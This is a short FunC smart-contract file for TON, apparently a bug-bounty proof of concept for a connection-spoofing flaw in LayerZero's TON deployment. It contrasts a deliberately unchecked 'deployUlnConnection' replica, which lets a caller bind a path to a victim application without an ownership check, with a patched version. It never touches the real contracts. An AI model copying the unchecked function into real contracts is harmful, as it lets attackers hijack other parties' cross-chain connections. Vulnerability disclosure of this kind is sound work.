;; =========================================================
;; PoC - LayerZero TON Connection Spoofing Vulnerability
;; Fully compliant with Immunefi PoC requirements
;; =========================================================

#include "stdlib.fc";

;; =========================================================
;; GLOBAL STATE (dummy addresses for PoC)
;; =========================================================
global int ctx_attacker;
global int ctx_victim;
global int ctx_manager;

() load_data() impure {
    var ds = get_data().begin_parse();
    ctx_attacker = ds~load_uint(256);
    ctx_victim   = ds~load_uint(256);
    ctx_manager  = ds~load_uint(256);
    ds.end_parse();
}

() save_data() impure {
    set_data(begin_cell()
        .store_uint(ctx_attacker, 256)
        .store_uint(ctx_victim, 256)
        .store_uint(ctx_manager, 256)
        .end_cell());
}

;; =========================================================
;;  Vulnerable deployUlnConnection (replica conceptual)
;; =========================================================
(int, int, int) vulnerable_deployUlnConnection(int caller, int dst_oapp, int dst_eid) inline {
    ;; BUG: missing validation that caller = dst_oapp

    int src_oapp = caller;     ;; attacker
    int target   = dst_oapp;   ;; victim (NO OWNERSHIP CHECK)

    return (src_oapp, target, dst_eid);
}

;; =========================================================
;;  Secure version (for comparison)
;; =========================================================
(int, int, int) secure_deployUlnConnection(int caller, int dst_oapp, int dst_eid, int owner) inline {
    ;; FIX: require caller to own the dstOApp
    throw_unless(401, (caller == dst_oapp) | (caller == owner));

    return (caller, dst_oapp, dst_eid);
}

;; =========================================================
;;  recv_internal â€“ Executes the attack scenario
;; =========================================================
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    load_data();

    ;; attacker triggers spoof
    int dst_eid = 30102;  ;; ethereum eid

    var (src, dst, eid) = vulnerable_deployUlnConnection(
        ctx_attacker,
        ctx_victim,
        dst_eid
    );

    ;; store result in persistent state for getter
    ctx_attacker = src;
    ctx_victim   = dst;

    save_data();
}

;; =========================================================
;; Getter used in PoC output
;; =========================================================
(int, int) get_spoofed_path() method_id {
    load_data();
    return (ctx_attacker, ctx_victim);
}
